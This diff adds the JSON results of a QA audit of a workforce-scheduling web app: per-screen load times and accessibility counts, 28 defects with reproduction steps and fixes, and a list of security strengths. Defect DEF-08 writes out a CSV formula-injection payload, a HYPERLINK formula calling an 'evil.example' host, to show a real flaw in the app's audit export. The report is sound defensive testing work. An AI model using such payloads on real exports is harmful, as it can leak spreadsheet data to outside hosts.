+   "loadMs": 2879,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "forecasting-capacity-plan.png"
+  },
+  {
+   "url": "/forecasting/accuracy-heatmap",
+   "heading": "Accuracy",
+   "loadMs": 5502,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 114,
+   "shot": "forecasting-accuracy-heatmap.png"
+  },
+  {
+   "url": "/forecasting/model-leaderboard",
+   "heading": "Models",
+   "loadMs": 3184,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "forecasting-model-leaderboard.png"
+  },
+  {
+   "url": "/scheduling/schedule-timeline",
+   "heading": "Schedule Timeline",
+   "loadMs": 2426,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-schedule-timeline.png"
+  },
+  {
+   "url": "/scheduling/generate-schedule",
+   "heading": "Generate Schedule",
+   "loadMs": 3111,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 5,
+   "shot": "scheduling-generate-schedule.png"
+  },
+  {
+   "url": "/scheduling/year-plan",
+   "heading": "Year Plan",
+   "loadMs": 2640,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-year-plan.png"
+  },
+  {
+   "url": "/scheduling/schedule-quality",
+   "heading": "Schedule Quality",
+   "loadMs": 2858,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-schedule-quality.png"
+  },
+  {
+   "url": "/scheduling/shift-templates",
+   "heading": "Shift Templates",
+   "loadMs": 3865,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 43,
+   "shot": "scheduling-shift-templates.png"
+  },
+  {
+   "url": "/scheduling/all-schedules",
+   "heading": "All Schedules",
+   "loadMs": 3837,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 25,
+   "shot": "scheduling-all-schedules.png"
+  },
+  {
+   "url": "/scheduling/multi-site",
+   "heading": "Multi-Site View",
+   "loadMs": 7706,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 25,
+   "shot": "scheduling-multi-site.png"
+  },
+  {
+   "url": "/scheduling/follow-the-sun",
+   "heading": "Follow the Sun",
+   "loadMs": 3039,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-follow-the-sun.png"
+  },
+  {
+   "url": "/scheduling/rotations",
+   "heading": "Rotation Patterns",
+   "loadMs": 2436,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-rotations.png"
+  },
+  {
+   "url": "/scheduling/shift-swaps",
+   "heading": "Shift Swaps",
+   "loadMs": 2385,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-shift-swaps.png"
+  },
+  {
+   "url": "/scheduling/vto-overtime",
+   "heading": "VTO & Overtime",
+   "loadMs": 2453,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [
+    "GET /api/v1/scheduling/offers/suggestions?groupId=66d57a0d-eb9d-45f9-bd92-aeb9d79230b5&day=2026-10-31 -> 400 {\"code\":\"BAD_REQUEST\",\"message\":\"There is no published schedule for this group on 2026-10-31. Publish one first: offers change the published schedule.\",\"requestId\":\"17c1267e-eb0b-4d7c-a19a-9946b42a0d9",
+    "GET /api/v1/scheduling/offers/suggestions?groupId=66d57a0d-eb9d-45f9-bd92-aeb9d79230b5&day=2026-10-31 -> 400 {\"code\":\"BAD_REQUEST\",\"message\":\"There is no published schedule for this group on 2026-10-31. Publish one first: offers change the published schedule.\",\"requestId\":\"ff4212af-4be2-4835-9a1d-7917279a786"
+   ],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-vto-overtime.png"
+  },
+  {
+   "url": "/scheduling/shift-bidding",
+   "heading": "Shift Bidding",
+   "loadMs": 2774,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-shift-bidding.png"
+  },
+  {
+   "url": "/scheduling/schedule-compare",
+   "heading": "Compare Versions",
+   "loadMs": 2579,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-schedule-compare.png"
+  },
+  {
+   "url": "/scheduling/schedule-replay",
+   "heading": "Schedule Replay",
+   "loadMs": 2436,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "scheduling-schedule-replay.png"
+  },
+  {
+   "url": "/intraday/live-coverage",
+   "heading": "Live Coverage",
+   "loadMs": 2196,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 3,
+   "shot": "intraday-live-coverage.png"
+  },
+  {
+   "url": "/intraday/adherence",
+   "heading": "Real-Time Adherence",
+   "loadMs": 2386,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 4,
+   "shot": "intraday-adherence.png"
+  },
+  {
+   "url": "/intraday/break-optimizer",
+   "heading": "Break Optimizer",
+   "loadMs": 2329,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 3,
+   "shot": "intraday-break-optimizer.png"
+  },
+  {
+   "url": "/intraday/ai-recommendations",
+   "heading": "Recommended Actions",
+   "loadMs": 2251,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 3,
+   "shot": "intraday-ai-recommendations.png"
+  },
+  {
+   "url": "/configuration/wfm-groups",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2602,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 257,
+   "shot": "configuration-wfm-groups.png"
+  },
+  {
+   "url": "/configuration/activities",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2996,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 17,
+   "shot": "configuration-activities.png"
+  },
+  {
+   "url": "/configuration/scheduling-rules",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2276,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "configuration-scheduling-rules.png"
+  },
+  {
+   "url": "/configuration/sites-skills",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 5782,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "configuration-sites-skills.png"
+  },
+  {
+   "url": "/configuration/integration-station",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2306,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 6,
+   "shot": "configuration-integration-station.png"
+  },
+  {
+   "url": "/configuration/compliance-packs",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2606,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "configuration-compliance-packs.png"
+  },
+  {
+   "url": "/configuration/self-service-rules",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2344,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "configuration-self-service-rules.png"
+  },
+  {
+   "url": "/configuration/rta-mapping",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2784,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "configuration-rta-mapping.png"
+  },
+  {
+   "url": "/configuration/optimization-objectives",
+   "heading": "Configuration & Optimization Policy",
+   "loadMs": 2201,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "configuration-optimization-objectives.png"
+  },
+  {
+   "url": "/data-management/staged-imports",
+   "heading": "Staged Data Ingestion",
+   "loadMs": 2298,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 41,
+   "shot": "data-management-staged-imports.png"
+  },
+  {
+   "url": "/data-management/data-quality",
+   "heading": "Data Quality",
+   "loadMs": 4076,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "data-management-data-quality.png"
+  },
+  {
+   "url": "/data-management/scheduled-syncs",
+   "heading": "Data Feeds",
+   "loadMs": 3415,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 8,
+   "a11ySerious": 4,
+   "shot": "data-management-scheduled-syncs.png"
+  },
+  {
+   "url": "/audit",
+   "heading": "Audit Log",
+   "loadMs": 2914,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 94,
+   "shot": "audit.png"
+  },
+  {
+   "url": "/administration/users",
+   "heading": "Users & roles",
+   "loadMs": 2671,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 41,
+   "shot": "administration-users.png"
+  },
+  {
+   "url": "/administration/roles",
+   "heading": "Users & roles",
+   "loadMs": 3284,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 180,
+   "a11ySerious": 2,
+   "shot": "administration-roles.png"
+  },
+  {
+   "url": "/administration/api-access",
+   "heading": "API & Single Sign-On",
+   "loadMs": 2780,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 6,
+   "shot": "administration-api-access.png"
+  },
+  {
+   "url": "/administration/alerts-reports",
+   "heading": "Alerts & Reports",
+   "loadMs": 2470,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 19,
+   "a11ySerious": 2,
+   "shot": "administration-alerts-reports.png"
+  },
+  {
+   "url": "/forecasting/forecast-builder",
+   "heading": "Forecast Builder",
+   "loadMs": 3891,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 7,
+   "shot": "forecasting-forecast-builder.png"
+  },
+  {
+   "url": "/forecasting/adjustments",
+   "heading": "Adjustments",
+   "loadMs": 2524,
+   "crashed": false,
+   "pageErrors": 0,
+   "apiErrors": [],
+   "a11yCritical": 7,
+   "a11ySerious": 2,
+   "shot": "forecasting-adjustments.png"
+  }
+ ],
+ "defects": [
+  {
+   "id": "DEF-01",
+   "sev": "Critical",
+   "area": "Security · Administration",
+   "title": "A disabled user's existing session keeps working",
+   "steps": "Create user → sign in (token) → admin sets status DISABLED → call GET /api/v1/workforce/employees with the old token",
+   "expected": "401/403 at once",
+   "actual": "200 OK — the token works until it expires (JWT_TTL=12h). New sign-ins are refused correctly.",
+   "evidence": "api-functional › Audit & Administration (existing session of disabled user is cut off → 200)",
+   "fix": "In authenticate(), reject tokens whose user is no longer ACTIVE (cache status in Redis for a few seconds), or keep a per-user token version and bump it on disable/role change/password reset."
+  },
+  {
+   "id": "DEF-14",
+   "sev": "Critical",
+   "area": "Reliability · Engine (scheduling)",
+   "title": "Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down",
+   "steps": "Seen twice: (1) during scripts/demo-seed.mjs (forecast → schedule); (2) during the gateway's own test run, seconds after 'cancel stops a running build inside the engine' passed, while the next multi-group solve ran",
+   "expected": "A failed solve fails that one request; the engine keeps serving",
+   "actual": "'Fatal Python error: Aborted' in ortools cp_model.Solve (backend/engine/scheduling.py:465, solve_cpsat) with the new cancel watchdog thread (scheduling.py:459, solver.StopSearch from another thread) alive. The whole process dies: every forecast and schedule request then returns 503 until someone restarts it. Earlier dead engines also left 3 hung server.py processes (each with 4 workers) running. Not reproduced on demand: 3 rounds of start → cancel → solve passed",
+   "evidence": "engine-crash-1.log (native stack of all threads); gateway-suite.txt (12 tests failed with ENGINE_UNAVAILABLE after the crash); /health engine:false",
+   "fix": "Run each CP-SAT solve in a child process (the ProcessPool already exists) so a native abort kills one job, not the server; re-check the uncommitted StopSearch-from-watchdog change (prefer a solution-callback stop or the solver's own time limit); run the engine under a supervisor that restarts it and kills the whole process tree; alert on /health engine:false."
+  },
+  {
+   "id": "DEF-02",
+   "sev": "High",
+   "area": "Workforce · Time off",
+   "title": "Admin can book overlapping time off for the same person",
+   "steps": "POST /workforce/time-off for an employee (15–16 days out), approve → POST another for days 16–17",
+   "expected": "400/409 overlap (self-service already blocks this: 'You already have … that overlaps these dates')",
+   "actual": "201 Created — double-booked leave, double-counted balance and pay",
+   "evidence": "api-functional › Workforce (overlapping time off rejected → 201)",
+   "fix": "Run the same overlap check used by POST /me/time-off inside POST /workforce/time-off (and in bulk/import paths)."
+  },
+  {
+   "id": "DEF-03",
+   "sev": "High",
+   "area": "Security · Configuration",
+   "title": "Administrator uses a password on the app's own blocklist and is never asked to change it",
+   "steps": "Sign in as admin (tenant ORG)",
+   "expected": "Strong password; temporary/bootstrap passwords force a change",
+   "actual": "Password is in EASY list of passwordPolicy.ts and contains the username; mustChangePassword=false",
+   "evidence": "api-security SEC-01",
+   "fix": "Rotate before go-live. Apply checkNewPassword() to BOOTSTRAP_ADMIN_PASSWORD and set must_change_password=true for the bootstrap admin."
+  },
+  {
+   "id": "DEF-04",
+   "sev": "High",
+   "area": "Admin UI · Command palette",
+   "title": "Ctrl+K search shows fake prototype records and cannot find real ones",
+   "steps": "Press Ctrl+K → type 'Jane' / 'Demo Support' / 'Shift Templates'",
+   "expected": "Live employees, groups and screens",
+   "actual": "'Jane Doe · EMP-1024 · Customer Billing' (does not exist); real group and screen names: 'No matching records'",
+   "evidence": "admin-e2e A-04, screens/palette-fake-data.png; src/components/common/CommandPalette.tsx uses SEED_EMPLOYEES/SEED_WFM_GROUPS/SEED_SKILLS from src/services/wfmStore.ts",
+   "fix": "Search the API (or the loaded stores) and the route list; delete the SEED_* data from the production bundle."
+  },
+  {
+   "id": "DEF-05",
+   "sev": "High",
+   "area": "Accessibility",
+   "title": "Admin sidebar cannot be used with a keyboard or screen reader",
+   "steps": "Load any admin screen → press Tab repeatedly",
+   "expected": "Every navigation item is focusable (links/buttons)",
+   "actual": "Only 1 focus stop in the sidebar in 40 Tabs — items are <div onClick> with no role or tabindex",
+   "evidence": "admin-e2e A-03; src/components/layout/NavigationSidebar.tsx",
+   "fix": "Render items as <a href> (they already have URLs) or <button>, with aria-current on the active one."
+  },
+  {
+   "id": "DEF-06",
+   "sev": "High",
+   "area": "Accessibility",
+   "title": "Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical)",
+   "steps": "axe-core WCAG 2.1 AA scan of all 51 admin screens",
+   "expected": "0 critical violations",
+   "actual": "button-name: 530 elements on 51/51 screens; plus select-name and missing form labels on one screen",
+   "evidence": "admin-crawl (axe) — see Accessibility section",
+   "fix": "Add aria-label to icon buttons (lucide icons inside <button>), label selects/inputs."
+  },
+  {
+   "id": "DEF-07",
+   "sev": "High",
+   "area": "Release · Licensing",
+   "title": "AG Grid Enterprise runs without a licence key",
+   "steps": "Open Workforce › Employees (console)",
+   "expected": "Licensed grid, no watermark",
+   "actual": "Console prints the AG Grid Enterprise licence banner; grids show the trial watermark",
+   "evidence": "admin-crawl console errors on Employees, Time Off, Attendance, Timeline, Live coverage, Activities",
+   "fix": "Set VITE_AG_GRID_LICENSE for the production build (or switch to the Community edition). Using Enterprise in production unlicensed breaches the licence."
+  },
+  {
+   "id": "DEF-08",
+   "sev": "Medium",
+   "area": "Security · Audit export",
+   "title": "CSV formula injection in the audit export",
+   "steps": "Create a team named =HYPERLINK(\"http://evil.example/?x=\"&A1,\"x\") → download /audit/export.csv",
+   "expected": "Cell neutralised ('=…)",
+   "actual": "Written raw: \"=HYPERLINK(\"\"http://evil.example/…\"\")\" — runs when opened in Excel",
+   "evidence": "api-security SEC-14",
+   "fix": "Reuse csvCell from modules/reports.ts (prefix = + - @ with ') in auditRoutes.ts and integrations/runner.ts and any other CSV writer."
+  },
+  {
+   "id": "DEF-09",
+   "sev": "Medium",
+   "area": "Security · Sessions",
+   "title": "Session token accepted in the URL (?token=) on every REST route",
+   "steps": "GET /api/v1/users?token=<jwt>",
+   "expected": "401 (header only)",
+   "actual": "200; the web app also opens /ws?token=<jwt>",
+   "evidence": "api-security SEC-05",
+   "fix": "Accept ?token= only on the WebSocket upgrade, ideally with a short-lived single-use ticket instead of the session JWT; strip it from access logs."
+  },
+  {
+   "id": "DEF-10",
+   "sev": "Medium",
+   "area": "Security · Sign-in",
+   "title": "Response time reveals whether a username exists",
+   "steps": "POST /auth/login with a wrong password for a real vs an unknown username (5 each)",
+   "expected": "Same timing",
+   "actual": "Real user median ≈ 808 ms, unknown ≈ 11 ms (bcrypt only runs for real users)",
+   "evidence": "api-security SEC-07",
+   "fix": "When no user is found, bcrypt.compare against a fixed dummy hash before failing."
+  },
+  {
+   "id": "DEF-11",
+   "sev": "Medium",
+   "area": "API · Validation",
+   "title": "Impossible calendar date returns 500 and leaks the PostgreSQL error",
+   "steps": "POST /me/time-off {startDate:'2026-02-30', endDate:'2026-02-30'}",
+   "expected": "400 'not a valid date'",
+   "actual": "500 'date/time field value out of range: \"2026-02-30\"'",
+   "evidence": "api-security SEC-15",
+   "fix": "isoDay is a regex only — add a real-date refine to the shared isoDay schema (affects every date input), and never return raw DB messages on 500."
+  },
+  {
+   "id": "DEF-12",
+   "sev": "Medium",
+   "area": "Audit",
+   "title": "Failed sign-in attempts are not written to the audit log",
+   "steps": "Fail a sign-in for admin → search audit",
+   "expected": "LOGIN_FAILED entry with IP",
+   "actual": "Only successful LOGIN is audited (lockouts are in Redis only)",
+   "evidence": "api-functional › Audit",
+   "fix": "Audit failed attempts and lockouts (needed for SOC 2 / ISO 27001 evidence)."
+  },
+  {
+   "id": "DEF-13",
+   "sev": "Medium",
+   "area": "Performance · Forecasting",
+   "title": "Forecast Builder takes ~34 s to finish loading",
+   "steps": "Open /forecasting/forecast-builder for Demo Support (10 weeks of history, one queue)",
+   "expected": "< 3 s",
+   "actual": "GET /forecast/history-quality takes 15–32 s and is requested twice on every load",
+   "evidence": "performance PERF-03 + request timing",
+   "fix": "Cache history-quality per group/version, compute it in the background, and de-duplicate the request in the screen."
+  },
+  {
+   "id": "DEF-15",
+   "sev": "Medium",
+   "area": "Performance",
+   "title": "Admin JavaScript is a single 4.2 MB chunk (1.18 MB gzipped)",
+   "steps": "vite build",
+   "expected": "Route-level code splitting, main chunk < 500 kB",
+   "actual": "index.js 4,234 kB + exceljs 940 kB; Vite warns about chunk size",
+   "evidence": "static/build-admin.txt",
+   "fix": "Lazy-load each module screen (React.lazy) and exceljs/recharts/ag-grid only where used."
+  },
+  {
+   "id": "DEF-16",
+   "sev": "Medium",
+   "area": "Performance · Scale",
+   "title": "Employee list is not paginated",
+   "steps": "GET /workforce/employees (≈ 420 people)",
+   "expected": "Paged/filtered",
+   "actual": "328 kB per call; 40 req/s with p95 627 ms at 25 concurrent",
+   "evidence": "performance PERF-01/02",
+   "fix": "Server-side paging and field selection; the grid can use the AG Grid server-side row model."
+  },
+  {
+   "id": "DEF-17",
+   "sev": "Medium",
+   "area": "Employee portal · Mobile",
+   "title": "Portal is not usable on a phone browser",
+   "steps": "Open localhost:3001 at 412 px width (Pixel 7)",
+   "expected": "Responsive layout / bottom tabs",
+   "actual": "Fixed 224 px sidebar leaves 188 px for content; Schedule scrolls sideways",
+   "evidence": "responsive R-01, screens/mobile-portal-*.png",
+   "fix": "Collapse the sidebar into a bottom tab bar under md breakpoint (same IA as the mobile app)."
+  },
+  {
+   "id": "DEF-18",
+   "sev": "Medium",
+   "area": "Accessibility",
+   "title": "Colour contrast below WCAG AA on every screen of both apps",
+   "steps": "axe scan",
+   "expected": "4.5:1 for text",
+   "actual": "822 elements on 51/51 admin screens; portal login and 4/5 sections",
+   "evidence": "admin-crawl, portal-e2e P-01/P-03",
+   "fix": "Darken #A3A3A3/#737373 secondary text on white/#FAFAF8 backgrounds."
+  },
+  {
+   "id": "DEF-19",
+   "sev": "Medium",
+   "area": "Security · Configuration",
+   "title": "NATS TLS certificate checking is switched off",
+   "steps": "backend/.env",
+   "expected": "NATS_TLS_REJECT_UNAUTHORIZED=true in production",
+   "actual": "false",
+   "evidence": "backend/.env (value only, no secret read)",
+   "fix": "Set to true with a trusted CA for production."
+  },
+  {
+   "id": "DEF-20",
+   "sev": "Low",
+   "area": "Employee portal",
+   "title": "Offers show an empty group name to the employee",
+   "steps": "GET /me/offers as an agent",
+   "expected": "groupName 'Demo Support' (as admin sees)",
+   "actual": "groupName \"\"",
+   "evidence": "api-functional › Self-service",
+   "fix": "Join the group name in the /me/offers query."
+  },
+  {
+   "id": "DEF-21",
+   "sev": "Low",
+   "area": "Employee portal · UX",
+   "title": "No URLs per section: reload always returns to Home, Back leaves the app",
+   "steps": "Open Inbox → reload",
+   "expected": "Stay on Inbox (admin app already has per-screen URLs)",
+   "actual": "Back on Home; nothing can be bookmarked or linked from a notification e-mail",
+   "evidence": "portal-e2e P-08",
+   "fix": "Use the same History-API routing as src/services/routes.ts."
+  },
+  {
+   "id": "DEF-22",
+   "sev": "Low",
+   "area": "Employee portal · UX",
+   "title": "Time-off form accepts end-before-start until it is submitted",
+   "steps": "Request time off → Start = day 60, End = day 55",
+   "expected": "Inline error, Submit disabled",
+   "actual": "Submit enabled; the server's 400 message is shown afterwards",
+   "evidence": "portal-e2e P-05",
+   "fix": "Validate in the form (it already pre-checks overlaps)."
+  },
+  {
+   "id": "DEF-23",
+   "sev": "Low",
+   "area": "Workforce · Validation",
+   "title": "Hire date in 2099 is accepted",
+   "steps": "POST /workforce/employees hireDate 2099-01-01",
+   "expected": "400 (e.g. > 1 year ahead)",
+   "actual": "201",
+   "evidence": "api-functional › Workforce",
+   "fix": "Bound hire dates."
+  },
+  {
+   "id": "DEF-24",
+   "sev": "Low",
+   "area": "API",
+   "title": "Malformed JSON returns error code INTERNAL",
+   "steps": "POST /config/groups with body '{\"name\":'",
+   "expected": "400 BAD_JSON",
+   "actual": "400 with code INTERNAL",
+   "evidence": "api-security SEC-12",
+   "fix": "Map body-parser SyntaxError to a 400 BAD_REQUEST code."
+  },
+  {
+   "id": "DEF-25",
+   "sev": "Low",
+   "area": "Security · Sign-in",
+   "title": "Unauthenticated endpoints reveal account existence and organisation name",
+   "steps": "POST /auth/discover {identifier:<email>}; GET /auth/login-options",
+   "expected": "Off in production unless needed",
+   "actual": "Returns the organisation for a real e-mail, [] otherwise (rate-limited 15 per 15 min)",
+   "evidence": "api-security SEC-08",
+   "fix": "Set LOGIN_DISCOVERY=false for production if the org code is distributed another way."
+  },
+  {
+   "id": "DEF-26",
+   "sev": "Low",
+   "area": "Both apps",
+   "title": "No favicon — 404 on every page load",
+   "steps": "GET /favicon.ico on :3000 and :3001",
+   "expected": "200",
+   "actual": "404 (console error on every screen)",
+   "evidence": "admin-crawl console",
+   "fix": "Add a favicon to public/."
+  },
+  {
+   "id": "DEF-27",
+   "sev": "Low",
+   "area": "Tooling",
+   "title": "scripts/demo-seed.mjs cannot finish",
+   "steps": "Run the seed on a stack with FORCE_PASSWORD_CHANGE on (the default)",
+   "expected": "Seed completes",
+   "actual": "The giveaway step gets 403 'Choose a new password' (new logins are temporary), and a failed step leaves the group behind so the seed refuses to run again",
+   "evidence": "qa/seed-finish.mjs works around it",
+   "fix": "Change the demo logins' passwords in the seed; make the seed resumable."
+  },
+  {
+   "id": "DEF-28",
+   "sev": "Info",
+   "area": "Data hygiene",
+   "title": "Existing data to clean before go-live",
+   "steps": "Configuration › Integration Station; Data Management › Staged imports",
+   "expected": "—",
+   "actual": "A connector points at nats://192.168.9.81:4222 (TIMEOUT); 6 failed history imports (672–5,000 rows rejected); test employees EXT7172 etc.",
+   "evidence": "admin-crawl visible errors",
+   "fix": "Start production from a clean database; do not migrate this test data."
+  }
+ ],
+ "strengths": [
+  "Role-based access control: 1,934 role × route checks over 327 guarded routes and 6 roles — no route answered without its permission, no role wrongly blocked, every guarded route returns 401 when signed out.",
+  "Token security: alg:none, role-swapped payload, bad signature, expired and garbage tokens all rejected; sign-out revokes the token server-side.",
+  "Brute force: sign-in locks after 10 failures per IP+user; password change locks after 5; password policy rejects short, common, username-based and repeated-character passwords.",
+  "Injection: SQL-injection probes on sign-in, search and IDs gave no 5xx and no bypass; HTML in names and reasons renders as text (no dangerouslySetInnerHTML anywhere).",
+  "Tenant/employee isolation: an agent cannot see, cancel or give away another agent's requests or shifts; mass-assignment fields are ignored.",
+  "Validation is strong across configuration (duplicates, time zones, SL > 100 %, queue hours), templates, forecast lifecycle (no publish before approve, no deleting a published forecast) and live feeds (negative volume, future events, unknown agents).",
+  "Scheduling quality: published 2-week schedule (282 shifts, 30 people) has 0 double-bookings, ≥ 11 h rest everywhere, ≤ 48 h/week, ≤ 6 days in a row; swap takes are refused when they would break rest/hours rules.",
+  "Self-service flows work end-to-end in the portal: forced first-login password change, time off (auto-approval by policy, overlap check), giveaways, VTO accept, overtime decline, inbox, sign-out.",
+  "API reads are fast (most 4–55 ms p95) and returned no 5xx under 25-way concurrency.",
+  "Headers: Helmet CSP, HSTS, X-Frame-Options, nosniff, no X-Powered-By; CORS allows only the admin origin.",
+  "Builds and checks: TypeScript clean in admin, portal and gateway; both production builds succeed; no secrets in the bundles; engine unit suite 91/91."
+ ]
+}
